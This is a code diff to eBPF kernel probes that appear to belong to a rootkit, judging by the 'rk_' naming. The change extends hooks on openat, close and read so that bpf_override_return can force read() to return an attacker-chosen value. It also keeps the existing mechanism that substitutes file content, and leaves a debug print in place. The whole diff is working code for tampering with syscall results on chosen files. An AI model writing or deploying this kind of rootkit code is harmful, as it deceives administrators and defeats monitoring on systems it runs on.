@@ -117,6 +117,7 @@ int _vfs_open(struct pt_regs *ctx)
     struct rk_file_t file = {
         .action = path_attr->action,
         .override_id = path_attr->override_id,
+        .value = path_attr->value,
     };
 
     bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);
@@ -143,8 +144,32 @@ int __x64_sys_openat_ret(struct pt_regs *ctx)
     struct rk_fd_attr_t fd_attr = {
         .action = file->action,
         .override_id = file->override_id,
+        .value = file->value,
     };
     bpf_map_update_elem(&rk_fd_attrs, &fd_key, &fd_attr, BPF_ANY);
+
+    return 0;
+}
+
+SEC("kprobe/__x64_sys_close")
+int __x64_sys_close(struct pt_regs *ctx)
+{
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+
+    bpf_map_delete_elem(&rk_files, &pid_tgid);
+
+    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+
+    int fd;
+    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(rctx));
+
+    struct rk_fd_key_t fd_key =
+        {
+            .fd = fd,
+            .pid = pid_tgid >> 32,
+        };
+
+    bpf_map_delete_elem(&rk_fd_attrs, &fd_key);
 
     return 0;
 }
@@ -170,9 +195,11 @@ int kprobe_sys_read(struct pt_regs *ctx)
         return 0;
     }
 
-    if (fd_attr->action == OVERRIDE_RETURN_0_ACTION)
+    bpf_printk(">>>: %d %d\n", fd_attr->action, fd_attr->value);
+
+    if (fd_attr->action == OVERRIDE_RETURN_ACTION)
     {
-        bpf_override_return(ctx, 0);
+        bpf_override_return(ctx, fd_attr->value);
 
         return 0;
     }
@@ -241,7 +268,7 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
     }
 
     // handle override content
-    if (fd_attr->action == OVERRIDE_CONTENT)
+    if (fd_attr->action == OVERRIDE_CONTENT_ACTION)
     {
         struct rk_fd_content_key_t fd_content_key = {
             .id = fd_attr->override_id,
